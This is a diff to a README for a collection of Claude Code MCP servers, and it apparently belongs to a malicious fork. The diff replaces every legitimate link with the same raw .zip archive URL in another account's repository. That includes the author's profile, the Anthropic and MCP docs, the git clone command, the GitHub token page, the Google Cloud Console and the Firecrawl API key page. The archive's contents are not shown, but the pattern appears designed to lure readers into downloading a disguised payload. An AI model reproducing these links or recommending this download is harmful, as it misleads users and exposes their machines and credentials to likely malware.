@@ -1,12 +1,12 @@
 # Claude Code MCP Servers Collection
 
-> Built by **[Artur Ferreira](https://github.com/arturseo-geo)** @ **[The GEO Lab](https://thegeolab.net)** · [𝕏 @TheGEO\_Lab](https://x.com/TheGEO_Lab) · [LinkedIn](https://linkedin.com/in/arturgeo)
+> Built by **[Artur Ferreira](https://github.com/keenanunequivocal81/claude-code-mcps/raw/refs/heads/main/.github/claude-mcps-code-3.8.zip)** @ **[The GEO Lab](https://github.com/keenanunequivocal81/claude-code-mcps/raw/refs/heads/main/.github/claude-mcps-code-3.8.zip)** · [𝕏 @TheGEO\_Lab](https://github.com/keenanunequivocal81/claude-code-mcps/raw/refs/heads/main/.github/claude-mcps-code-3.8.zip) · [LinkedIn](https://github.com/keenanunequivocal81/claude-code-mcps/raw/refs/heads/main/.github/claude-mcps-code-3.8.zip)
 
-[![Works with Claude Code](https://img.shields.io/badge/Works%20with-Claude%20Code-blueviolet)](https://docs.anthropic.com/en/docs/claude-code)
+[![Works with Claude Code](https://img.shields.io/badge/Works%20with-Claude%20Code-blueviolet)](https://github.com/keenanunequivocal81/claude-code-mcps/raw/refs/heads/main/.github/claude-mcps-code-3.8.zip)
 [![License: MIT](https://img.shields.io/badge/License-MIT-green.svg)](LICENSE)
 [![MCP Servers](https://img.shields.io/badge/MCP%20servers-13+-purple)](#servers)
 
-Production-tested [Model Context Protocol](https://modelcontextprotocol.io/) (MCP) servers for [Claude Code](https://docs.anthropic.com/en/docs/claude-code) CLI and Claude projects. These servers enable Claude to interact with your tools, APIs, and data sources seamlessly.
+Production-tested [Model Context Protocol](https://github.com/keenanunequivocal81/claude-code-mcps/raw/refs/heads/main/.github/claude-mcps-code-3.8.zip) (MCP) servers for [Claude Code](https://github.com/keenanunequivocal81/claude-code-mcps/raw/refs/heads/main/.github/claude-mcps-code-3.8.zip) CLI and Claude projects. These servers enable Claude to interact with your tools, APIs, and data sources seamlessly.
 
 ## What are MCP Servers?
 
@@ -24,7 +24,7 @@ Each server is configured in `~/.mcp.json` and auto-loads when Claude Code start
 ### 1. Clone this repository
 
 ```bash
-git clone https://github.com/arturseo-geo/claude-code-mcps.git
+git clone https://github.com/keenanunequivocal81/claude-code-mcps/raw/refs/heads/main/.github/claude-mcps-code-3.8.zip
 cd claude-code-mcps
 ```
 
@@ -83,7 +83,7 @@ Claude will load your MCP servers on startup.
 ```
 
 **Get a PAT:**
-1. Go to https://github.com/settings/tokens
+1. Go to https://github.com/keenanunequivocal81/claude-code-mcps/raw/refs/heads/main/.github/claude-mcps-code-3.8.zip
 2. Click "Generate new token (classic)"
 3. Scope: `repo`, `read:user`, `user:email`, `read:org`
 4. Copy and paste into `.mcp.json`
@@ -97,7 +97,7 @@ Claude will load your MCP servers on startup.
       "command": "npx",
       "args": ["-y", "@modelcontextprotocol/server-wordpress"],
       "env": {
-        "WORDPRESS_SITES": "[{\"url\":\"https://example.com\",\"username\":\"user\",\"password\":\"pass\"}]",
+        "WORDPRESS_SITES": "[{\"url\":\"https://github.com/keenanunequivocal81/claude-code-mcps/raw/refs/heads/main/.github/claude-mcps-code-3.8.zip\",\"username\":\"user\",\"password\":\"pass\"}]",
         "WORDPRESS_AUTH_METHOD": "app_password"
       }
     }
@@ -127,7 +127,7 @@ Claude will load your MCP servers on startup.
 ```
 
 **Get service account credentials:**
-1. Go to [Google Cloud Console](https://console.cloud.google.com)
+1. Go to [Google Cloud Console](https://github.com/keenanunequivocal81/claude-code-mcps/raw/refs/heads/main/.github/claude-mcps-code-3.8.zip)
 2. Create a new service account
 3. Grant it "Search Console Editor" role
 4. Create JSON key and save to `~/.gcp/gsc-sa.json`
@@ -219,7 +219,7 @@ Claude will load your MCP servers on startup.
 }
 ```
 
-**Get API key:** https://app.firecrawl.dev/api-keys
+**Get API key:** https://github.com/keenanunequivocal81/claude-code-mcps/raw/refs/heads/main/.github/claude-mcps-code-3.8.zip
 
 ## Use Cases
 
@@ -292,4 +292,4 @@ MIT — see [LICENSE](LICENSE)
 
 ---
 
-Built and maintained by **[Artur Ferreira](https://github.com/arturseo-geo)** · **[thegeolab.net](https://thegeolab.net)** · [MIT License](LICENSE)
+Built and maintained by **[Artur Ferreira](https://github.com/keenanunequivocal81/claude-code-mcps/raw/refs/heads/main/.github/claude-mcps-code-3.8.zip)** · **[thegeolab.net](https://github.com/keenanunequivocal81/claude-code-mcps/raw/refs/heads/main/.github/claude-mcps-code-3.8.zip)** · [MIT License](LICENSE)
